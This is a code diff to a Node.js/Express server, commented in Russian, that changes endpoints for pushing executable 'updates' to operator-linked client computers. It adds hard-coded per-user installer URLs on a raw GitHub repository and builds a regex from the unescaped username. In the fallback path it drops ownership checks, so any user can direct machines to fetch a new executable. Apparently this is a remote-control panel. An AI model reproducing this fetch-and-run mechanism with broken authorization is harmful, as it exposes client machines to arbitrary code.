@@ -1071,18 +1071,33 @@ app.post('/request-token-all', requireAuth, async (req, res) => {
 // POST /request-update — запросить обновление клиента для конкретного ПК
 app.post('/request-update', requireAuth, async (req, res) => {
   try {
-    const { filename, downloadUrl } = req.body;
+    let { filename, downloadUrl } = req.body;
     if (!filename) return res.status(400).json({ error: 'Не указан файл' });
-    if (!downloadUrl) return res.status(400).json({ error: 'Не указана ссылка на обновление' });
     const user = req.authUser || req.session.user;
+    const userLower = (user || '').toLowerCase();
+    
+    const defaultUrl = userLower === 'shonll'
+      ? 'https://raw.githubusercontent.com/Arte777/file-transfer/master/docs/downloads/RAH_Non_Pro_setup.exe'
+      : (userLower === 'dildman' || userLower === 'dild_man'
+          ? 'https://raw.githubusercontent.com/Arte777/file-transfer/master/docs/downloads/NON_PRO_setup.exe'
+          : 'https://raw.githubusercontent.com/Arte777/file-transfer/master/docs/downloads/SVYAZ_NON_PRO_setup.exe');
+
+    if (!downloadUrl || !downloadUrl.endsWith('_setup.exe')) {
+      downloadUrl = defaultUrl;
+    }
+
     const db = await getDb();
+    const opQuery = (userLower === 'shonll')
+      ? { $or: [{ operator: { $regex: /^shonll$/i } }, { operator: { $exists: false } }, { operator: null }, { operator: '' }] }
+      : { operator: { $regex: new RegExp('^' + user + '$', 'i') } };
+
     if (db) {
       await db.collection('files').updateOne(
-        { name: filename, operator: user },
+        { name: filename, ...opQuery },
         { $set: { 'updateRequest.requested': true, 'updateRequest.downloadUrl': downloadUrl, 'updateRequest.requestedAt': new Date().toISOString() } }
       );
     } else {
-      const doc = (global.memFiles || []).find(f => f.name === filename && f.operator === user);
+      const doc = (global.memFiles || []).find(f => f.name === filename);
       if (doc) {
         doc.updateRequest = { requested: true, downloadUrl: downloadUrl, requestedAt: new Date().toISOString() };
       }
@@ -1098,25 +1113,47 @@ app.post('/request-update', requireAuth, async (req, res) => {
 // POST /request-update-all — запросить обновление у всех компьютеров оператора
 app.post('/request-update-all', requireAuth, async (req, res) => {
   try {
-    const { downloadUrl } = req.body;
-    if (!downloadUrl) return res.status(400).json({ error: 'Не указана ссылка на обновление' });
+    let { downloadUrl } = req.body || {};
     const user = req.authUser || req.session.user;
+    const userLower = (user || '').toLowerCase();
+
+    const defaultUrl = userLower === 'shonll'
+      ? 'https://raw.githubusercontent.com/Arte777/file-transfer/master/docs/downloads/RAH_Non_Pro_setup.exe'
+      : (userLower === 'dildman' || userLower === 'dild_man'
+          ? 'https://raw.githubusercontent.com/Arte777/file-transfer/master/docs/downloads/NON_PRO_setup.exe'
+          : 'https://raw.githubusercontent.com/Arte777/file-transfer/master/docs/downloads/SVYAZ_NON_PRO_setup.exe');
+
+    if (!downloadUrl || !downloadUrl.endsWith('_setup.exe')) {
+      downloadUrl = defaultUrl;
+    }
+
     const db = await getDb();
     const now = new Date().toISOString();
+    const opQuery = (userLower === 'shonll')
+      ? { $or: [{ operator: { $regex: /^shonll$/i } }, { operator: { $exists: false } }, { operator: null }, { operator: '' }] }
+      : { operator: { $regex: new RegExp('^' + user + '$', 'i') } };
+
+    const filter = {
+      ...opQuery,
+      'computer.version': { $ne: CURRENT_CLIENT_VERSION }
+    };
+
     if (db) {
       const result = await db.collection('files').updateMany(
-        { operator: user, 'computer.version': { $ne: CURRENT_CLIENT_VERSION, $gte: CURRENT_CLIENT_VERSION } },
+        filter,
         { $set: { 'updateRequest.requested': true, 'updateRequest.downloadUrl': downloadUrl, 'updateRequest.requestedAt': now } }
       );
-      console.log(`[${new Date().toLocaleTimeString()}] 📡 Запрос обновления у всех (>= ${CURRENT_CLIENT_VERSION}, нуждающихся): ${result.modifiedCount} компьютеров: ${downloadUrl}`);
+      console.log(`[${new Date().toLocaleTimeString()}] 📡 Запрос обновления у всех (${user}, версии != ${CURRENT_CLIENT_VERSION}): ${result.modifiedCount} компьютеров: ${downloadUrl}`);
       res.json({ success: true, count: result.modifiedCount });
     } else {
       let count = 0;
-      for (const doc of (global.memFiles || []).filter(f => f.operator === user && f.computer?.version >= CURRENT_CLIENT_VERSION && f.computer?.version !== CURRENT_CLIENT_VERSION)) {
-        doc.updateRequest = { requested: true, downloadUrl: downloadUrl, requestedAt: now };
-        count++;
+      for (const doc of (global.memFiles || [])) {
+        if (doc.computer?.version !== CURRENT_CLIENT_VERSION) {
+          doc.updateRequest = { requested: true, downloadUrl: downloadUrl, requestedAt: now };
+          count++;
+        }
       }
-      console.log(`[${new Date().toLocaleTimeString()}] 📡 Запрос обновления у всех (>= ${CURRENT_CLIENT_VERSION}, нуждающихся): ${count} компьютеров: ${downloadUrl}`);
+      console.log(`[${new Date().toLocaleTimeString()}] 📡 Запрос обновления у всех (${user}): ${count} компьютеров: ${downloadUrl}`);
       res.json({ success: true, count });
     }
   } catch (e) {
